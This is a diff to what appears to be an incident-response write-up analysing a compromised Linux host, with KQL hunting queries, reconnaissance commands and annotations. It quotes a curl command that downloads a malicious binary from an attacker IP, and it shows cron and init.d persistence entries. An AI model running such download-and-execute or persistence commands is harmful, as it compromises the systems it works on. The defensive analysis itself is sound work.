@@ -92,6 +92,15 @@ This detection prompted analysis of:
 
 ### First Look Into Compromised Device
 
+- multiple reconiassance commands observed:
+   - `la -la` Lists files/directories, including hidden ones (-a) with permissions (-l)
+   - `who` Shows logged-in users
+   - `cat /etc/resolv.conf` reads contents of /resolv.conf, typically contains DNS resolver configuration
+   - `uptime` Displays how long the system has been running, number of users, load averages
+   - `cd /etc` hanges the working directory to /etc
+
+  <Br>
+  
 ```kql
 DeviceProcessEvents
 | where DeviceName contains "fix-michael"
@@ -107,7 +116,7 @@ DeviceProcessEvents
 - What this means:
    - A persistent root-level session existed for ~48 hours
    - That session repeatedly executed thousands of short-lived binaries
-   - Filenames were randomized
+   - Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.
    - Execution counts were throttled per binary
    - Activity pattern indicates automation, not human typing
    - Behavior is inconsistent with legitimate admin activity
@@ -201,7 +210,7 @@ DeviceFileEvents
 <br>
 <br>
 
-**Full malware command with annotations**
+**Full command with annotations**
 ```bash
 # --- Cleanup old folders & recreate working directory ---
 rm -rf /var/tmp/Documents /tmp/cache             # Remove old malware staging directories and temp files
@@ -299,17 +308,22 @@ This activity was automated and non-interactive
 
 <br>
 
-### Malicious Binary Download p.txt ./ygljglkjgfg0
+### Malicious Binary Download p.txt
 
 <img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
 
+- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
+   - `p.txt` malicious ELF binary
+   - `ygljglkjgfg0` renamed executable copy
+
+<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
 - `ygljglkjgfg0` appears
    - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
    - First seen at /usr/bin/ygljglkjgfg0 = persistent executable
    - Then copied to /etc/init.d/ygljglkjgfg0 = run at boot
    - and /etc/cron.hourly/gcc.sh = run every hour or as scheduled
   
-- Inumerable randomized file names copied from ygljglkjgfg0
+- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
 - These are clones or secondary payloads:
    - Backdoors
    - Miner binaries
@@ -326,7 +340,10 @@ The malware edits /etc/crontab to remove old references to gcc.sh and add a new 
    -*/3 * * * * root /etc/cron.hourly/gcc.sh
    - malware will run every 3 minutes
 
-   - <br>
+23.160.56.194 > p.txt download
+<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
+
+   <br>
    
 ---
 
@@ -364,39 +381,6 @@ The malware edits /etc/crontab to remove old references to gcc.sh and add a new 
 
 
 
-
-
-- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
-./ygljglkjgfg0
-   - p.txt = malicious ELF binary
-   - ygljglkjgfg0 = renamed executable copy
-
-<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
-
-23.160.56.194 > p.txt download
-<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
-
----
-
-### Multiple Download Methods Observed
-
-Process telemetry revealed redundant payload retrieval attempts:
-
-```kql
-DeviceProcessEvents  
-| where DeviceName == "linux-programmatic-fix-michael"  
-| where ProcessCommandLine has_any ("curl", "wget", "good")  
-| project TimeGenerated, FileName, ProcessCommandLine  
-| order by TimeGenerated asc  
-```
-
-The same payload was retrieved using:
-
-- `curl`  
-- `wget`  
-- `good` (a renamed system utility)  
-
-This behavior strongly indicates **automated malware execution**, not manual user activity.
 
 ---
 
